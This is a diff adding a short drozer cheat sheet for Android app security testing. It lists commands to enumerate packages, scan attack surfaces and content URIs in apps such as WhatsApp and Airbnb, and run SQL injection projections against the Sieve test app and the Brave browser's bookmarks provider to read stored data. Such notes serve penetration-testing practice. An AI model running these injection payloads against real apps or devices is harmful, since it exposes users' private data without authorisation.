@@ -1,0 +1,84 @@
+To get all packages list:
+
+run app.package.list
+_____________________________________________________________
+
+To check if service is: null
+
+run app.service.info -a us.zoom.videomeetings
+_____________________________________________________________
+
+To get content URIs:
+
+run scanner.provider.finduris -a com.airbnb.android
+_____________________________________________________________
+
+To Scan for attack surfaces:
+
+run app.package.attacksurface jakhar.aseem.diva
+_____________________________________________________________
+
+To scan all Providers in package:
+
+run app.provider.info -a com.whatsapp
+_____________________________________________________________
+
+Content URIs:
+
+run scanner.provider.finduris -a com.traveloka.android
+------
+If you find any content uri's that drozer is able to query, then:
+
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
+
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'" 
+
+run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
+
+_____________________________________________________________
+
+If you run this:
+
+run app.provider.query content://com.brave.browser.browser/bookmarks/search_suggest_query/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
+
+And get this:
+
+| _id | url | visits | date | bookmark | title | favicon | created |
+
+Do this to access the data:
+
+run app.provider.query content://com.brave.browser.browser/bookmarks/search_suggest_query/ --projection "url, visits, date, bookmark, title, favicon, created"
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
+
+
+
+_____________________________________________________________
